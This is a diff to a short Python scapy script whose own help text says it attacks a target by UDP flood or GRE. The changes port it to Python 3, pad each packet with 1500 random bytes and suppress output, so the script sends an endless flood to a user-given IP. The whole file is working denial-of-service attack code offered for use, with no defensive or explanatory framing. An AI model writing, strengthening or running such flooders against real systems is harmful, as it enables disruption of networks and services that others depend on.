@@ -1,17 +1,20 @@
 import sys
 import argparse
+import os
 from scapy.all import *
 
 def gre(tgt_ip):
-    p = IP(dst=tgt_ip)/GRE()
-    print "Sending GRE packets"
+    data = os.urandom(1500)
+    p = IP(dst=tgt_ip)/GRE()/Raw(load=data)
+    print ("Sending GRE packets")
     while True:
-        send(p, count = 100)
+        send(p, count = 100, verbose = 0)
 def udp(tgt_ip):
-    p = IP(dst=tgt_ip)/UDP() 
-    print "Sending UPD packets"
+    data = os.urandom(1500)
+    p = IP(dst=tgt_ip)/UDP()/Raw(load=data)
+    print ("Sending UPD packets")
     while True:
-        send(p, count = 100)
+        send(p, count = 100, verbose = 0)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description = 'Attack a target by UDP flood or GRE')
@@ -21,10 +24,10 @@ if __name__ == '__main__':
     proto.add_argument('-g', '-gre', '--g', '--gre', help='use GRE packets', action="store_true")
     args=parser.parse_args() 
     if args.u:
-        print "Targeting " +  args.ip[0] + " via UDP"
+        print ("Targeting " +  args.ip[0] + " via UDP")
         udp(args.ip[0])
     elif args.g:
-        print "Targeting " +  args.ip[0] + " via GRE"
+        print ("Targeting " +  args.ip[0] + " via GRE")
         gre(args.ip[0])
     else:
-        print "something happened"
+        print ("something happened")
